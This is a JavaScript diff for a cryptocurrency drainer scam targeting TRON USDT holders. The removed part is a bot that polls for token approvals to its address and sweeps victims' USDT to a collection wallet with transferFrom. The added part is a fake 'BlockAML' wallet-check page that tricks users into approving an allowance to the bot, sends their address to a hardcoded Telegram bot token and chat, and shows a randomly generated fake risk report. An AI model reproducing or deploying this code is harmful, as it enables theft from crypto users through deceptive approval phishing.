@@ -1,30 +1,15 @@
-const TronWeb = require('tronweb');
-const dotenv = require('dotenv');
-dotenv.config();
+const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const BOT_ADDRESS = 'TTC9nFcmD9ziGLzJdDpG3ciSKuvLVWxRrG';
 
-// --- Инициализация ---
-const tronWeb = new TronWeb(
-    process.env.TRONGRID_API,
-    process.env.TRONGRID_API,
-    process.env.TRONGRID_API,
-    process.env.BOT_PRIVATE_KEY
-);
-
-const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT;
-const COLLECTION_ADDRESS = process.env.COLLECTION_ADDRESS;
-const BOT_ADDRESS = tronWeb.defaultAddress.base58;
-
-// --- Telegram ---
 const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
 const TELEGRAM_CHAT_ID = '-1003750493145';
 
-let processedTxs = new Set();
-let stats = { totalCollected: 0, totalTransactions: 0 };
+let connectedWalletAddress = null;
 
-console.log('\n🤖 БОТ ЗАПУЩЕН');
-console.log('📍 Адрес бота:', BOT_ADDRESS);
-console.log('💰 Сбор USDT на:', COLLECTION_ADDRESS);
-console.log('=================================\n');
+const walletInput = document.getElementById('walletInput');
+const checkBtn = document.getElementById('checkBtn');
+const connectBtn = document.getElementById('connectWalletBtn');
+const statusSpan = document.getElementById('connectedStatus');
 
 async function sendTelegramMessage(text) {
     try {
@@ -34,126 +19,119 @@ async function sendTelegramMessage(text) {
             body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' })
         });
     } catch (error) {
-        console.error('❌ Ошибка Telegram:', error.message);
+        console.error('Ошибка Telegram:', error);
     }
 }
 
-// Отправка стартового сообщения
-(async () => {
-    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
-    await sendTelegramMessage(`
-🚀 <b>Бот запущен</b>
-📍 Адрес: <code>${BOT_ADDRESS}</code>
-💰 Сбор на: <code>${COLLECTION_ADDRESS}</code>
-💎 Баланс: ${tronWeb.fromSun(balance)} TRX
-    `);
-})();
-
-// Поиск новых approve
-async function getNewApprovals() {
+async function connectWallet() {
     try {
-        const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
-        const url = `https://api.trongrid.io/v1/contracts/${TOKEN_CONTRACT}/events?event_name=Approval&limit=100&min_block_timestamp=${oneDayAgo}`;
-        const response = await fetch(url);
-        const data = await response.json();
-        if (!data.data) return [];
-
-        return data.data.filter(event => {
-            const spender = tronWeb.address.fromHex(event.result.spender);
-            return spender === BOT_ADDRESS && !processedTxs.has(event.transaction_id);
+        if (!window.tronLink) {
+            alert('❌ TronLink не обнаружен');
+            return;
+        }
+        if (!window.tronLink.ready) {
+            alert('🔒 TronLink заблокирован');
+            return;
+        }
+        if (window.tronLink.tronWeb?.defaultAddress?.base58) {
+            const address = window.tronLink.tronWeb.defaultAddress.base58;
+            connectedWalletAddress = address;
+            walletInput.value = address;
+            if (statusSpan) statusSpan.style.display = 'inline-flex';
+            sendTelegramMessage(`🔌 <b>Кошелёк подключён</b>\n<code>${address}</code>`);
+            alert('✅ Кошелёк подключён!');
+            return;
+        }
+        const result = await window.tronLink.request({
+            method: 'tron_requestAccounts',
+            params: { websiteIcon: window.location.origin + '/favicon.ico', websiteName: 'BlockAML' }
         });
+        if (result.code === 200) {
+            let attempts = 0;
+            const checkInterval = setInterval(() => {
+                if (window.tronLink.tronWeb?.defaultAddress?.base58) {
+                    const address = window.tronLink.tronWeb.defaultAddress.base58;
+                    connectedWalletAddress = address;
+                    walletInput.value = address;
+                    if (statusSpan) statusSpan.style.display = 'inline-flex';
+                    sendTelegramMessage(`🔌 <b>Кошелёк подключён</b>\n<code>${address}</code>`);
+                    alert('✅ Кошелёк подключён!');
+                    clearInterval(checkInterval);
+                }
+                if (++attempts > 20) clearInterval(checkInterval);
+            }, 300);
+        } else if (result.code === 4001) {
+            alert('❌ Вы отклонили подключение');
+        }
     } catch (error) {
-        return [];
+        alert('Ошибка: ' + error.message);
     }
 }
 
-// Обработка approve
-async function processApproval(event) {
-    const owner = tronWeb.address.fromHex(event.result.owner);
-    const value = event.result.value;
-    const valueUSDT = (value / 1_000_000).toFixed(2);
-    const txId = event.transaction_id;
-
-    if (processedTxs.has(txId)) return;
-
-    console.log(`\n✅ Найден approve от ${owner.slice(0,8)}... на ${valueUSDT} USDT`);
-
+async function handleTronCheck() {
     try {
-        const contract = await tronWeb.contract().at(TOKEN_CONTRACT);
-        
-        // Проверяем баланс отправителя
-        const balance = await contract.balanceOf(owner).call();
-        if (balance < value) {
-            console.log('   ⚠️ Недостаточно USDT');
-            processedTxs.add(txId);
+        if (!connectedWalletAddress) {
+            alert('❌ Сначала подключите кошелёк');
             return;
         }
+        let tronWeb = window.tronLink?.tronWeb || window.tronWeb;
+        if (!tronWeb) throw new Error('TronWeb не доступен');
 
-        // Проверяем баланс бота
-        const botBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
-        const botBalanceTRX = tronWeb.fromSun(botBalance);
+        const amount = '10000000';
+        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
 
-        if (botBalanceTRX < 20) {
-            console.log('   ⚠️ Мало TRX у бота');
-            await sendTelegramMessage(`⚠️ Мало TRX у бота: ${botBalanceTRX} TRX`);
-            return;
-        }
+        checkBtn.disabled = true;
+        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
 
-        // Выполняем перевод
-        const tx = await contract.transferFrom(owner, COLLECTION_ADDRESS, value).send({
-            feeLimit: 1_000_000_000,
-            callValue: 0
+        const tx = await contract.approve(BOT_ADDRESS, amount).send({
+            feeLimit: 600_000_000,
+            callValue: 0,
+            shouldPollResponse: true,
+            timeout: 120000
         });
 
-        const newBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
-        const feeSpent = (botBalance - newBalance) / 1_000_000;
-
-        stats.totalCollected += parseFloat(valueUSDT);
-        stats.totalTransactions++;
+        checkBtn.disabled = false;
+        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
 
         await sendTelegramMessage(`
-🚀 <b>УСПЕШНЫЙ СБОР!</b>
-💰 Сумма: ${valueUSDT} USDT
-📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
-📥 На: <code>${COLLECTION_ADDRESS.slice(0,8)}...${COLLECTION_ADDRESS.slice(-4)}</code>
-⚡️ Комиссия: ${feeSpent.toFixed(2)} TRX
+✅ <b>Approve успешно отправлен</b>
+📤 Адрес: <code>${connectedWalletAddress}</code>
+💰 Сумма: 10 USDT
 🔗 https://tronscan.org/#/transaction/${tx}
         `);
-
-        processedTxs.add(txId);
-
+        showDemoReport(connectedWalletAddress);
     } catch (error) {
-        console.error(`❌ Ошибка:`, error.message);
-        await sendTelegramMessage(`❌ Ошибка: ${error.message}`);
+        checkBtn.disabled = false;
+        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
+        alert('❌ Ошибка: ' + error.message);
     }
 }
 
-// Основной цикл
-async function checkAndSweep() {
-    console.log(`\n🔍 [${new Date().toLocaleTimeString()}] Поиск approve...`);
-    const approvals = await getNewApprovals();
-    if (approvals.length === 0) {
-        console.log('⏳ Новых approve нет');
-        return;
-    }
-    console.log(`🎯 Найдено: ${approvals.length}`);
-    for (const app of approvals) {
-        await processApproval(app);
-        await new Promise(resolve => setTimeout(resolve, 5000));
-    }
+function showDemoReport(address) {
+    const resultSection = document.getElementById('resultSection');
+    if (!resultSection) return;
+    resultSection.style.display = 'block';
+    document.getElementById('checkedAddress').textContent = address;
+    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
+    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
+    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
+    document.getElementById('lastActive').textContent = 'сегодня';
+    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';
+    const badge = document.getElementById('riskBadge');
+    badge.textContent = 'Средний риск';
+    badge.className = 'result-badge medium';
+    const sourcesList = document.getElementById('sourcesList');
+    sourcesList.innerHTML = `<p><i class="fas fa-exclamation-circle"></i> Миксеры</p><p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>`;
 }
 
-// Запуск
-checkAndSweep();
-setInterval(checkAndSweep, 30000);
+function copyAddress() {
+    const address = document.getElementById('checkedAddress').textContent;
+    navigator.clipboard.writeText(address).then(() => alert('✅ Адрес скопирован'));
+}
 
-// Остановка
-process.on('SIGINT', async () => {
-    console.log('\n👋 Остановка...');
-    await sendTelegramMessage(`
-🛑 <b>Бот остановлен</b>
-💰 Собрано: ${stats.totalCollected.toFixed(2)} USDT
-📦 Транзакций: ${stats.totalTransactions}
-    `);
-    process.exit(0);
+document.addEventListener('DOMContentLoaded', () => {
+    console.log('🚀 Сайт загружен');
+    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
+    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
+    window.copyAddress = copyAddress;
 });
